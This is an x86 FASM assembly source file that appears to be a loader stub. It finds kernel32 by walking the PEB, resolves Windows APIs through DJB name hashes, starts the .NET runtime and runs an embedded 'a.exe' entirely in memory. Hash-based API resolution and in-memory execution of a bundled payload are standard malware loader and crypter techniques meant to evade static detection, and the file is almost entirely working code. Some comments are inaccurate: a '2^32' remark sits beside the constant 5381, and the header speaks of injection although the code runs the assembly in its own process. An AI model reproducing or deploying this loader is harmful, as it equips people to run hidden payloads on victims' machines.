; Inject a .NET executable in a classic process
; Tested on Windows 8 x64, written with the FASM syntax

format PE GUI 4.0
entry start
include 'include\win32w.inc'

VT_UI1 equ 17
VT_VARIANT equ 12

;-------------------------------------------------
; code
    section '.code' code readable writable executable
;-------------------------------------------------

start:
    call delta

delta:
    pop ebp                          
    sub ebp, delta                    

    ; kernel32 api
    lea eax, [ebp+GetKernel32]
    call eax
    mov [ebp+dwKernel32], eax  

    mov ecx, 4
    lea esi, [ebp+dwHashLoadLibraryA]
    lea edi, [ebp+dwLoadLibraryA]
    loopApiKernel:
        push ecx ; save it
        push dword[esi]
        push [ebp+dwKernel32]
        lea eax, [ebp+GetFunctionAddr]
        call eax
        mov [edi], eax
        pop ecx
        add esi, 4
        add edi, 4
        dec ecx
        cmp ecx, 0
    jne loopApiKernel

    ; mscoree api
    lea ebx, [ebp+szMscoree]
    push ebx
    call [ebp+dwLoadLibraryA]
    mov [ebp+dwMscoree], eax

    push [ebp+dwHashCLRCreateInstance]
    push [ebp+dwMscoree]
    lea eax, [ebp+GetFunctionAddr]
    call eax  
    mov [ebp+dwCLRCreateInstance], eax

    ; OleAut32 api
    lea eax, [ebp+szOleAut32]
    push eax
    call [ebp+dwLoadLibraryA]
    mov [ebp+dwOleAut32], eax

    mov ecx, 4
    lea esi, [ebp+dwHashSafeArrayCreate]
    lea edi, [ebp+dwSafeArrayCreate]
    loopApiOleAut:
        push ecx ; save it
        push dword[esi]
        push [ebp+dwOleAut32]
        lea eax, [ebp+GetFunctionAddr]
        call eax
        mov [edi], eax
        pop ecx
        add esi, 4
        add edi, 4
        dec ecx
        cmp ecx, 0
    jne loopApiOleAut

    ; CLRCreateInstance
    lea eax, [ebp+dwMetaHost]
    lea ebx, [ebp+riidMetaHost]
    lea ecx, [ebp+clsidMetaHost]
    push eax
    push ebx
    push ecx
    call [ebp+dwCLRCreateInstance]
    cmp eax, 0
    jne exit

    ; pMetaHost->GetRuntime
    lea eax, [ebp+dwRuntimeInfo]
    push eax
    lea eax, [ebp+riidRuntimeInfo]
    push eax
    lea eax, [ebp+szVersion]
    push eax

    mov ecx, [ebp+dwMetaHost]		; this
    push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 3*4]			; VTable[3]
    call edx
    cmp eax, 0
    jne exit

    ; pRuntimeInfo->GetInterface
    lea eax, [ebp+dwCorRuntimeHost]
    push eax
    lea eax, [ebp+riidCorRuntimeHost]
    push eax
    lea eax, [ebp+clsidCorRuntimeHost]
    push eax

    mov ecx, [ebp+dwRuntimeInfo]	; this
    push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 9*4]			; VTable[9]	
    call edx
    cmp eax, 0
    jne exit

    ; pCorRuntimeHost->Start()
    mov ecx, [ebp+dwCorRuntimeHost]	; this
    push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 10*4]			; VTable[10]	
    call edx   	
    cmp eax, 0
    jne exit

    ; pCorRuntimeHost->GetDefaultDomain
    lea eax, [ebp+dwAppDomain]
    push eax
  	mov ecx, [ebp+dwCorRuntimeHost]
  	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 13*4]			; VTable[13]	
    call edx   	
    cmp eax, 0
    jne exit

    ; pAppDomainThunk->QueryInterface
    lea eax, [ebp+dwDefaultAppDomain]
    push eax
    lea eax, [ebp+riidDefaultAppDomain]
    push eax
    mov ecx, [ebp+dwAppDomain]		; this
   	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 0*4]			; VTable[0]	
    call edx   	
    cmp eax, 0
    jne exit   

    ; Safe array creation
    mov eax, [ebp+dwFileSize]
    mov [ebp+dwBounds], eax
    mov [ebp+dwBounds+4], 0

    lea eax, [ebp+dwBounds]
    push eax
    push 1
    push VT_UI1
    call [ebp+dwSafeArrayCreate]
    cmp eax, 0
    je exit
    mov [ebp+dwSafeArray], eax

    ; Fill the safe array
    xor ecx, ecx
    loopFillArray:
    	push ecx 				; save the counter

    	lea eax, [ebp+dwFile+ecx]
    	push eax 				; &(dwFile[ecx])
    	mov [ebp+dwI], ecx
    	lea eax, [ebp+dwI]
    	push eax 				; &ecx
    	push [ebp+dwSafeArray]
    	call [ebp+dwSafeArrayPutElement]

    	pop ecx 				; get back the counter
    	inc ecx
    	cmp ecx, [ebp+dwFileSize]
    	jne loopFillArray

    ; pDefaultAppDomain->Load_3
    lea eax, [ebp+dwAssembly]
    push eax
    push [ebp+dwSafeArray]
    mov ecx, [ebp+dwDefaultAppDomain] 	; this
    push ecx
    mov edx, [ecx]						; VTable
    mov edx, [edx + 45*4]				; VTable[45]	
    call edx   	
    cmp eax, 0
    jne exit  

    ; SafeArrayDestroy
    push [ebp+dwSafeArray]
    call [ebp+dwSafeArrayDestroy]

    ; pAssembly->get_EntryPoint
    lea eax, [ebp+dwEntryPoint]
    push eax
    mov ecx, [ebp+dwAssembly]		; this
   	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 16*4]			; VTable[16]	
    call edx   	
    cmp eax, 0
    jne exit   

    ; pMethodInfo->GetParameters
    lea eax, [ebp+dwParameters]
    push eax
    mov ecx, [ebp+dwEntryPoint]		; this
   	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 18*4]			; VTable[18]	
    call edx   	
    cmp eax, 0
    je exit 						; done   

    ; Call the entrypoint
    ; pMethodInfo->Invoke_3
    lea eax, [ebp+variantObj]
    push eax
    call [ebp+dwVariantInit]
    lea eax, [ebp+variantObjRet]
    push eax
    call [ebp+dwVariantInit]

    lea eax, [ebp+variantObjRet]
    push eax
    push [ebp+dwParameters]
    push dword[ebp+variantObj+0xC] 		
    push dword[ebp+variantObj+0x8] 		
    push dword[ebp+variantObj+0x4] 		
    push dword[ebp+variantObj] 		
    mov ecx, [ebp+dwEntryPoint]		; this
   	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 37*4]			; VTable[37]	
    call edx   	
    cmp eax, 0
    je exit 						; done   

    ; Not done? Try with a parameter    
    mov [ebp+dwBounds], 1
    mov [ebp+dwBounds+4], 0

    lea eax, [ebp+dwBounds]
    push eax
    push 1
    push VT_VARIANT
    call [ebp+dwSafeArrayCreate]
    mov [ebp+dwSafeArray], eax
    cmp eax, 0
    je exit 

    lea eax, [ebp+variantObjRet]
    push eax
    push [ebp+dwSafeArray]
    push dword[ebp+variantObj+0xC] 		
    push dword[ebp+variantObj+0x8] 		
    push dword[ebp+variantObj+0x4] 		
    push dword[ebp+variantObj] 		
    mov ecx, [ebp+dwEntryPoint]		; this
   	push ecx
    mov edx, [ecx]					; VTable
    mov edx, [edx + 37*4]			; VTable[37]	
    call edx

exit:
    ; stop the process
    push 0
    call [ebp+dwExitProcess]
    ret


;--------------------------------------------------------------------------------------------------


proc GetFunctionAddr
    mov eax, dword[esp+4]               ; DLL
    cmp word [eax], 5A4Dh
    jne exit                            ; Bad signature
    mov edx, [eax+3Ch]                  ; DosHeader.e_lfanew
    add eax, edx                        ; On passe au PE Header
    cmp dword [eax], 4550h
    jne exit                            ; Si la signature est corrompu, on quitte
    
    mov edx, [eax+78h]                  ; PeHeader.EAT.VirtualAdress
    mov eax, dword [esp+4]              ; DLL
    add eax, edx                        ; On a trouvé l'EAT \o/
    
    mov edx, [eax+18h]                  ; EAT.NumberOfNames
    mov dword [ebp+dwNumberOfNames], edx
    mov edx, [eax+1Ch]                  ; EAT.AddressOfFunctions
    mov dword [ebp+dwFunctions], edx
    mov edx, [eax+24h]                  ; EAT.AddressOfNameOrdinals
    mov dword [ebp+dwNameOrdinals], edx
    mov eax, [eax+20h]                  ; EAT.AddressOfNames
    add eax, dword [esp+4]              ; EAX contient maintenant la table des noms
    xor ecx, ecx

    NameLoop:
        mov edx, [eax]                  ; EDX contient le RVA du nom
        add edx, dword [esp+4]          ; VA
        
        ;-------------------
        push ecx
        push eax                        ; On sauvegarde nos valeurs
        
        push edx                        ; On pousse le nom sur la pile
        lea eax, [ebp+DjbHash]
        call eax                        ; On appel DjbHash - EAX va contenir le hash
        mov edx, eax

        pop eax
        pop ecx                         ; On récupére nos valeurs
        ;-------------------
        
        cmp edx, [esp+8]
        je LoadApi
        
        add eax, 4                      ; On passe au nom suivant
        inc ecx
        cmp ecx, dword [ebp+dwNumberOfNames] ; On a vue toutes les fonctions ?
    jne NameLoop
    
    LoadApi:
    
    mov eax, dword [ebp+dwNameOrdinals] ; EAT.AddressOfNameOrdinals
    add eax, dword [esp+4]      ; On passe à une VA
    xor edx, edx
    mov dx, word [eax+ecx*2]            ; On choppe son ordinal
    mov eax, dword [ebp+dwFunctions]    ; EAT.AddressOfFunctions
    add eax, dword [esp+4]              ; On passe à une VA
    mov eax, dword [eax+edx*4]          ; Yop, on a le RVA de la fonction
    add eax, dword [esp+4]              ; On passe à une VA -> WIN \o/

    retn 8
endp
 
proc GetKernel32
    mov eax, [fs:30h]       ; PEB
    mov eax, [eax + 0Ch]    ; PEB->Ldr
    mov eax, [eax + 14h]    ; PEB->Ldr.InMemoryOrderModuleList.Flink 
    mov eax, [eax]	    	; ntdll.dll
    mov eax, [eax]	    	; kernel32.dll
    mov eax, [eax + 10h]    ; Address base
                
    ret
endp

proc DjbHash
    mov edx, [esp+4]
    mov eax, 5381d          ; 2^32
    
    hLoop:
        mov ecx, eax        
        shl eax, 5          ; eax << 5
        add eax, ecx        ; eax + old eax
        
        movzx ecx, byte[edx]    ; retaining
        add eax, ecx            
        
        inc edx             ; str++
        cmp byte [edx], 0   ; end of string
        jne hLoop
        
    retn 4
endp

proc StrCatW
    mov edi, [esp+4]
    mov esi, [esp+8]
    
    loop1:
        add edi, 2          ; str++
        cmp byte[edi], 0    ; end of string
        jne loop1

    loop2:
        mov ax, word[esi]
        mov [edi], ax
        add edi, 2
        add esi, 2           
        cmp word[esi], 0  ; end of string
        jne loop2
    mov word[edi], 0
        
    retn 8
endp

;-------------------------------------------------
; data
;-------------------------------------------------

dwKernel32 dd 0
dwNumberOfNames dd 0
dwFunctions dd 0
dwNameOrdinals dd 0

dwHashLoadLibraryA dd 0x5fbff0fb
dwHashVirtualAlloc dd 0x382c0f97
dwHashVirtualFree dd 0x668fcf2e
dwHashExitProcess dd 0xb769339e
dwLoadLibraryA dd 0
dwVirtualAlloc dd 0
dwVirtualFree dd 0
dwExitProcess dd 0  

szMscoree db 'mscoree.dll', 0
dwMscoree dd 0
dwHashCLRCreateInstance dd 0xd609560f
dwCLRCreateInstance dd 0

szOleAut32 db 'OleAut32.dll', 0
dwOleAut32 dd 0
dwHashSafeArrayCreate dd 0xf83197
dwHashSafeArrayPutElement dd 0x2a64e766
dwHashSafeArrayDestroy dd 0x4fad4c8d
dwHashVariantInit dd 0x3abfca4e
dwSafeArrayCreate dd 0
dwSafeArrayPutElement dd 0
dwSafeArrayDestroy dd 0
dwVariantInit dd 0

szVersion du 'v2.0.50727',0
clsidMetaHost db 0x8D,0x18,0x80,0x92,0x8E,0x0E,0x67,0x48,0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE
riidMetaHost db 0x9E,0xDB,0x32,0xD3,0xB3,0xB9,0x25,0x41,0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16
dwMetaHost dd 0
riidRuntimeInfo db 0xD2,0xD1,0x39,0xBD,0x2F,0xBA,0x6A,0x48,0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91
dwRuntimeInfo dd 0
clsidCorRuntimeHost db 0x23,0x67,0x2F,0xCB,0x3A,0xAB,0xD2,0x11,0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E
riidCorRuntimeHost db 0x22,0x67,0x2F,0xCB,0x3A,0xAB,0xD2,0x11,0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E
dwCorRuntimeHost dd 0
dwAppDomain dd 0
riidDefaultAppDomain db 0xDC,0x96,0xF6,0x05,0x29,0x2B,0x63,0x36,0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13
dwDefaultAppDomain dd 0

dwBounds dd 0 ; cElements
		 dd 0 ; ILbound
dwSafeArray dd 0
dwI dd 0
dwAssembly dd 0
dwEntryPoint dd 0
variantObj dd 0, 0, 0, 0 		; sizeof(VARIANT) = 16
variantObjRet dd 0, 0, 0, 0 

dwParameters dd 0

dwFileSize dd 0x4A00
dwFile:
	file 'a.exe'